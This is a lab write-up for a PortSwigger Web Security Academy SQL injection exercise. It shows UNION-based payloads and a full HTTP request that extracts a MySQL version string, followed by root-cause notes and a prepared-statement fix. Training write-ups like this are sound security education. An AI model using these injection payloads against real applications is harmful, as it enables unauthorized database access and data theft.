# PortSwigger Lab Write-up – SQL Injection (Database Type and Version)

## 🧪 Lab

**SQL Injection – Querying the Database Type and Version (MySQL & Microsoft)**

Platform: PortSwigger Web Security Academy

---

## 🧠 Vulnerability

**SQL Injection**

The application does not properly sanitize user input. The `category` parameter is directly inserted into the SQL query, allowing attackers to inject malicious SQL statements.

Example vulnerable request:

```
GET /filter?category=Accessories HTTP/2
Host: lab-id.web-security-academy.net
```

Possible backend query:

```
SELECT name, description
FROM products
WHERE category = 'Accessories'
```

Because the input is directly concatenated into the SQL query, the application becomes vulnerable to SQL Injection.

---

## 🎯 Goal

Identify the **database type and version** used by the application.

The lab requires retrieving the following database version string:

```
8.0.42-0ubuntu0.20.04.1
```

---

## 🔍 Exploitation

First, confirm the number of columns returned by the query.

Payload used:

```
' UNION SELECT NULL,NULL #
```

After confirming that the query returns **two columns**, the following payload was used to retrieve the database version.

Payload:

```
' UNION SELECT @@version, NULL #
```

Final exploit request:

```
GET /filter?category=' UNION SELECT @@version, NULL # HTTP/2
Host: lab-id.web-security-academy.net
Cookie: session=YOUR_SESSION
User-Agent: Mozilla/5.0
```

---

## 📊 Result

The server response returned the database version.

Example output:

```
8.0.42-0ubuntu0.20.04.1
```

This confirms that the backend database is **MySQL**.

---

## 🛡 Root Cause

* User input is directly included in SQL queries
* No input validation or sanitization
* Application does not use prepared statements

---

## 🔒 Mitigation / Fix

### Use Prepared Statements

Example (PHP PDO):

```
$stmt = $pdo->prepare("SELECT name, description FROM products WHERE category = ?");
$stmt->execute([$category]);
```

### Input Validation

Restrict user input to only valid categories.

### Use ORM or Query Builder

Avoid building raw SQL queries with user input.

---

## 🧰 Tools Used

* Burp Suite
* Firefox
* PortSwigger Web Security Academy

---

## 📚 References

* OWASP Top 10 – SQL Injection
* PortSwigger Web Security Academy

---

⚠️ Disclaimer

This repository is for educational purposes only.
All testing was performed on intentionally vulnerable applications provided by PortSwigger Web Security Academy.
